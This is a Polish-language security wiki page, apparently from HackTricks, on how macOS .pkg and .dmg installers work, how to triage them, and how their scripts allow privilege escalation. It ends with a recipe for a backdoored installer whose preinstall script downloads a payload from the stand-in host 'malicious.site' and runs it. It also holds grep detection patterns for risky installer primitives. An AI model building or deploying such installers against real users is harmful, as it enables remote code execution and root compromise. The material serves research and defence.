# Abuse macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje o Pkg

macOS **installer package** (znany również jako plik `.pkg`) to format pliku używany przez macOS do **dystrybucji software**. Pliki te przypominają **pudełko zawierające wszystko, czego potrzebuje dany software**, aby poprawnie się zainstalować i działać.

Sam plik pakietu jest archiwum zawierającym **hierarchię plików i katalogów, które zostaną zainstalowane na komputerze docelowym**. Może również zawierać **scripts** wykonujące zadania przed instalacją i po niej, takie jak konfigurowanie plików konfiguracyjnych lub usuwanie starych wersji software.

### Struktura pakietu

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Dostosowania (tytuł, tekst powitalny…) oraz sprawdzanie scripts/instalacji
- **PackageInfo (xml)**: Informacje, wymagania instalacji, lokalizacja instalacji, ścieżki do scripts do uruchomienia
- **Bill of materials (bom)**: Lista plików do zainstalowania, zaktualizowania lub usunięcia wraz z uprawnieniami plików
- **Payload (CPIO archive gzip compressed)**: Pliki do zainstalowania w `install-location` z PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre- i post-install scripts oraz dodatkowe zasoby wypakowywane do tymczasowego katalogu w celu wykonania.

### Dekompresja
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Aby wyświetlić zawartość instalatora bez ręcznego dekompresowania go, możesz również użyć darmowego narzędzia [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Skróty statycznego triage'u

Jeśli celem jest analiza, spróbuj **najpierw unikać otwierania pakietu za pomocą `Installer.app`**. Niektóre pakiety mogą wykonywać kod natychmiast po ich otwarciu przez Installer (na przykład za pomocą `system.run()` lub wtyczek instalatora), dlatego ekstrakcja offline jest zazwyczaj bezpieczniejszym punktem wyjścia.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Podstawowe informacje o DMG

Pliki DMG, czyli Apple Disk Images, to format plików używany przez Apple macOS dla obrazów dysków. Plik DMG jest zasadniczo **montowalnym obrazem dysku** (zawiera własny system plików), który zawiera surowe dane blokowe, zwykle skompresowane, a czasami zaszyfrowane. Po otwarciu pliku DMG macOS **montuje go tak, jakby był fizycznym dyskiem**, umożliwiając dostęp do jego zawartości.

> [!CAUTION]
> Należy pamiętać, że instalatory **`.dmg`** obsługują **tak wiele formatów**, że w przeszłości niektóre z nich zawierające luki w zabezpieczeniach były wykorzystywane do uzyskania **wykonania kodu w kernelu**.

### Struktura obrazu dysku

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchia pliku DMG może się różnić w zależności od zawartości. Jednak w przypadku DMG aplikacji zwykle ma ona następującą strukturę:

- Poziom główny: Jest to katalog główny obrazu dysku. Często zawiera aplikację oraz ewentualnie link do folderu Applications.
- Aplikacja (.app): Jest to właściwa aplikacja. W macOS aplikacja jest zazwyczaj pakietem zawierającym wiele pojedynczych plików i folderów tworzących aplikację.
- Link do Applications: Jest to skrót do folderu Applications w macOS. Jego celem jest ułatwienie instalacji aplikacji. Możesz przeciągnąć plik .app na ten skrót, aby zainstalować aplikację.

## Privesc via pkg abuse

### Wykonywanie z publicznych katalogów

Jeśli skrypt pre- lub post-instalacyjny wykonuje plik taki jak **`/var/tmp/Installerutil`**, a attacker może zastąpić ten plik, może eskalować uprawnienia, gdy installer go wywoła. The d talks and walkthrough show variants of this insecure external-script pattern.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Jest to [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), którą wywołuje kilka installerów i updaterów, aby **wykonać coś jako root**. Funkcja ta przyjmuje jako parametr **path** do **file**, który ma zostać **wykonany**, jednak jeśli attacker mógłby **zmodyfikować** ten plik, byłby w stanie **abuse** jego wykonania z uprawnieniami root w celu **eskalacji uprawnień**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Więcej informacji znajdziesz w tym talku: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Nadużywanie środowiska i shebang

Najnowsze błędy w PackageKit pokazały, że skrypty instalatorów są często wykonywane jako **zaufany kod root**, a jednocześnie w ich pobliżu nadal znajduje się kontekst kontrolowany przez atakującego. Podczas audytowania pakietów dostawców zwróć szczególną uwagę na:

- Interpretery powłoki, takie jak `#!/bin/zsh` / `#!/bin/bash`
- Wywołania takie jak `sudo -u $USER`, `launchctl asuser` lub dowolną logikę, która ufa zmiennym `$USER`, `$HOME`, `PATH`, `TMPDIR` albo ścieżkom względnym
- Interpretery inne niż shell, które mogą ładować kontrolowane przez użytkownika pliki init lub biblioteki
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
W przypadku błędu root-environment w PackageKit z 2024 roku (dziedziczenie `~/.zshenv` / `~/.bash*` podczas instalacji inicjowanych przez użytkownika) sprawdź [ogólną stronę o macOS privesc](../macos-privilege-escalation.md). Jeśli package jest **Apple-signed**, ten sam błąd skryptu może stać się **istotny dla SIP/TCC**, ponieważ `system_installd` może posiadać `com.apple.rootless.install.heritable`; zobacz [stronę o SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Wykonanie przez montowanie

Jeśli installer zapisuje do `/tmp/fixedname/bla/bla`, możliwe jest **utworzenie mountu** nad `/tmp/fixedname` z noowners, dzięki czemu można **modyfikować dowolny plik podczas instalacji**, aby nadużyć procesu instalacji.

Przykładem jest **CVE-2021-26089**, które umożliwiło **nadpisanie periodic script**, aby uzyskać wykonanie jako root. Więcej informacji znajduje się w prezentacji: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg jako malware

### Pusty Payload

Możliwe jest wygenerowanie pliku **`.pkg`** zawierającego **pre i post-install scripts** bez żadnego rzeczywistego payloadu poza malware znajdującym się w tych skryptach.<sup>[[2]](#references)</sup>

### JS w Distribution xml

Możliwe jest dodanie tagów **`<script>`** do pliku **distribution xml** package, a zawarty w nich kod zostanie wykonany i może **wykonywać polecenia** przy użyciu **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

W przypadku distribution packages zazwyczaj zależy to od tego, czy plik najwyższego poziomu `Distribution` włącza external scripts, na przykład za pomocą `allow-external-scripts="true"`. Dlatego sprawdzanie wyłącznie `preinstall` / `postinstall` nie wystarcza: sam **Distribution XML** może zawierać hooki `installation-check` / `volume-check` oraz bezpośrednie ścieżki wykonania `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer z backdoorem

Malicious installer używający skryptu i kodu JS wewnątrz dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Rozpakowywanie Pkgs: Spojrzenie do środka pakietów instalatora MacOS i typowe luki w zabezpieczeniach](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: „Dziki świat instalatorów macOS” - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Rozpakowywanie Pkgs: Spojrzenie do środka pakietów instalatora MacOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming macOS: wykorzystywanie pakietów instalatora](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: eskalacja uprawnień w macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Przełamywanie SIP za pomocą pakietów podpisanych przez Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: „Góra błędów” - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Śmierć od 1000 instalatorów w macOS i wszystko jest zepsute!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
